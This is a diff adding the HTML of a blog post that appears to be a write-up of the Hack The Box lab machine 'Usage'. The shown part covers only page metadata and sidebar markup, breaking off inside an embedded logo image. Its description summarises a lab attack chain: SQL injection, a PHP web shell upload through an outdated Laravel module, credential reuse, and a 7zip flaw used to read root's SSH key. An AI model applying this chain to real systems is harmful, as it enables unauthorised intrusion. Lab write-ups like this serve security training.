@@ -1,0 +1,974 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system."><title>HTB | Usage</title><link rel=canonical href=https://leopoldabgn.github.io/p/usage-htb/><link rel=stylesheet href=/scss/style.min.43715118627f0ddaca31ce1b7a5b384da06ff9dd2d6f578695318ea19426b0ad.css><meta property='og:title' content="HTB | Usage"><meta property='og:description' content="Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system."><meta property='og:url' content='https://leopoldabgn.github.io/p/usage-htb/'><meta property='og:site_name' content="leopoldabgn's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Linux'><meta property='article:tag' content='Easy'><meta property='article:published_time' content='2024-08-08T00:00:00+00:00'><meta property='article:modified_time' content='2024-08-08T00:00:00+00:00'><meta name=twitter:title content="HTB | Usage"><meta name=twitter:description content="Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system."><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><div class=site-meta><h1 class=site-name><a href=/>leopoldabgn's Blog</a></h1><h2 class=site-description>OSCP+ certified</h2></div></header><ol class=menu-social><li><a href=https://github.com/leopoldabgn target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://app.hackthebox.com/users/1676673 target=_blank title=HackTheBox rel=me><svg version="1.2" viewBox="0 0 1200 1200" width="1200" height="1200"><title>htb-logo</title><defs><image width="1024" height="1168" id="img1" href="data:image/png;base64,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PQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA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